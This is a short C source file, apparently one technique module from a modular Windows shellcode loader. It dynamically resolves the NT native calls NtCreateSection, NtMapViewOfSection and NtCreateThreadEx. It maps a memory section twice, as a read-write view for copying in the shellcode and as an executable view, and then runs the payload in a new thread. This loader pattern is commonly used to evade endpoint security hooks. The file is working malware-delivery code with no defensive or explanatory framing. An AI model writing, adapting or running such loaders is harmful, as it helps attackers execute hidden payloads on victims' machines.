#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_nt_section(unsigned char *sc, size_t len) {
    fnNtCreateSection pCreateSec =
        (fnNtCreateSection)ntapi_resolve("NtCreateSection");
    fnNtMapViewOfSection pMapView =
        (fnNtMapViewOfSection)ntapi_resolve("NtMapViewOfSection");
    fnNtCreateThreadEx pThread =
        (fnNtCreateThreadEx)ntapi_resolve("NtCreateThreadEx");
    fnNtWaitForSingleObject pWait =
        (fnNtWaitForSingleObject)ntapi_resolve("NtWaitForSingleObject");
    if (!pCreateSec || !pMapView || !pThread || !pWait) return FALSE;

    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)len;

    HANDLE hSection = NULL;
    if (!NT_SUCCESS(pCreateSec(&hSection, SECTION_ALL_ACCESS, NULL,
                               &secSize, PAGE_EXECUTE_READWRITE,
                               SEC_COMMIT, NULL)))
        return FALSE;

    PVOID rwBase = NULL;
    SIZE_T viewSize = 0;
    if (!NT_SUCCESS(pMapView(hSection, (HANDLE)-1, &rwBase, 0, 0, NULL,
                             &viewSize, 1, 0, PAGE_READWRITE))) {
        CloseHandle(hSection);
        return FALSE;
    }

    memcpy(rwBase, sc, len);

    PVOID rxBase = NULL;
    viewSize = 0;
    if (!NT_SUCCESS(pMapView(hSection, (HANDLE)-1, &rxBase, 0, 0, NULL,
                             &viewSize, 1, 0, PAGE_EXECUTE_READ))) {
        CloseHandle(hSection);
        return FALSE;
    }

    HANDLE hThread = NULL;
    if (!NT_SUCCESS(pThread(&hThread, THREAD_ALL_ACCESS, NULL,
                            (HANDLE)-1, rxBase, NULL, 0, 0, 0, 0, NULL))) {
        CloseHandle(hSection);
        return FALSE;
    }

    pWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
    CloseHandle(hSection);
    return TRUE;
}
